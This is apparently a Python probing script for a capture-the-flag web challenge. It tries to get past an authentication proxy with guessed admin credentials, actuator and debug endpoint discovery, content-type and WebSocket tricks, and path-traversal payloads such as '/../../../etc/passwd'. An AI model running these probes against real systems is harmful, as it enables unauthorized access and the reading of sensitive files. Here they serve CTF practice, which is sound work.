"""
Advanced bypass attempts for the CTFd proxy.
"""
import requests
import re
import http.client
import base64

BASE = "http://blockcitytimes.web.ctf.umasscybersec.org:5000"
s = requests.Session()

# 1. Try HTTP Basic Auth directly through the proxy
# If the proxy passes Authorization header through, the Spring Boot backend
# might authenticate the request directly
print("[1] Testing HTTP Basic Auth passthrough...")
creds_to_try = [
    ("admin", "blockworld"),
    ("admin", "changed_on_remote"),
    ("admin", "admin"),
    ("admin", "password"),
]
for user, passwd in creds_to_try:
    for path in ["/actuator/health", "/actuator/env", "/api/config", "/submit"]:
        try:
            r = requests.get(f"{BASE}{path}", auth=(user, passwd), timeout=10, allow_redirects=False)
            is_auth = "Authenticate" in r.text if r.text else False
            is_redirect = r.status_code in [301, 302]
            print(f"  {user}:{passwd} {path:25s} -> {r.status_code} | Auth={is_auth} | Redir={is_redirect} | Len={len(r.text)}")
            if not is_auth and not is_redirect and r.status_code == 200:
                print(f"    *** POSSIBLE BYPASS! ***")
                print(f"    {r.text[:500]}")
        except Exception as e:
            print(f"  {user}:{passwd} {path:25s} -> ERROR: {e}")

# 2. Try static CSS/JS from the proxy - maybe contains hints
print("\n[2] Testing proxy static files...")
static_paths = [
    "/static/css/style.css",
    "/static/css/theme-orange.css",
    "/static/js/",
    "/static/",
    "/static/js/app.js",
    "/static/js/main.js",
]
for path in static_paths:
    try:
        r = requests.get(f"{BASE}{path}", timeout=10, allow_redirects=False)
        if r.status_code == 200 and "Authenticate" not in r.text:
            print(f"  {path:35s} -> {r.status_code} | Len={len(r.text)}")
            if len(r.text) < 2000:
                print(f"    Content: {r.text[:500]}")
            else:
                print(f"    First 300 chars: {r.text[:300]}")
        else:
            print(f"  {path:35s} -> {r.status_code}")
    except Exception as e:
        print(f"  {path:35s} -> ERROR: {e}")

# 3. Try WebSocket upgrade
print("\n[3] Testing WebSocket upgrade...")
try:
    r = requests.get(f"{BASE}/submit", headers={
        "Upgrade": "websocket",
        "Connection": "Upgrade",
        "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ==",
        "Sec-WebSocket-Version": "13"
    }, timeout=10, allow_redirects=False)
    print(f"  WebSocket upgrade: {r.status_code} | {r.text[:200]}")
except Exception as e:
    print(f"  WebSocket: {e}")

# 4. Try with different Content-Type on POST
print("\n[4] Testing POST with different content types...")
# Maybe the proxy doesn't check POST requests with certain content types
for ct in ["application/json", "application/xml", "multipart/form-data", "text/plain"]:
    try:
        body = '{"test": "test"}' if ct == "application/json" else "test"
        r = requests.post(f"{BASE}/submit", data=body, 
                         headers={"Content-Type": ct}, timeout=10, allow_redirects=False)
        is_auth = "Authenticate" in r.text if r.text else False
        print(f"  Content-Type: {ct:30s} -> {r.status_code} | Auth={is_auth}")
        if not is_auth and r.status_code not in [302, 301]:
            print(f"    *** POSSIBLE BYPASS! ***")
            print(f"    {r.text[:500]}")
    except Exception as e:
        print(f"  Content-Type: {ct:30s} -> ERROR: {e}")

# 5. Try accessing the proxy's own debug/config endpoints
print("\n[5] Testing proxy debug endpoints...")
debug_paths = [
    "/debug", "/config", "/status", "/health", "/info", 
    "/_debug", "/__debug__", "/admin-panel",
    "/env", "/internal", "/proxy",
    "/robots.txt", "/sitemap.xml", "/.env",
    "/flag", "/secret", "/token",
]
for path in debug_paths:
    try:
        r = requests.get(f"{BASE}{path}", timeout=10, allow_redirects=False)
        is_redirect = r.status_code in [301, 302]
        is_auth = "Authenticate" in r.text if r.text else False
        if not is_auth and not is_redirect and r.status_code != 404:
            print(f"  {path:25s} -> {r.status_code} | ***INTERESTING***")
            print(f"    {r.text[:500]}")
        else:
            print(f"  {path:25s} -> {r.status_code}")
    except Exception as e:
        print(f"  {path:25s} -> ERROR: {e}")

# 6. Try path traversal on the proxy itself
print("\n[6] Testing path traversal on proxy...")
traversal_paths = [
    "/../",
    "/..;/",
    "/%2e%2e/",
    "/%252e%252e/",
    "/..%00/",
    "/../../../etc/passwd",
    "/..%252f..%252f",
]
for path in traversal_paths:
    try:
        r = requests.get(f"{BASE}{path}", timeout=10, allow_redirects=False)
        is_auth = "Authenticate" in r.text if r.text else False
        is_redirect = r.status_code in [301, 302]
        print(f"  {path:35s} -> {r.status_code} | Auth={is_auth}")
        if not is_auth and not is_redirect and r.status_code == 200:
            print(f"    *** BYPASS! *** {r.text[:300]}")
    except Exception as e:
        print(f"  {path:35s} -> ERROR: {e}")

# 7. Check full proxy page HTML for any hidden forms or links
print("\n[7] Full proxy page HTML analysis...")
r = requests.get(f"{BASE}/", timeout=10)
print(f"  Full HTML ({len(r.text)} bytes):")
print(r.text)

print("\nDone")
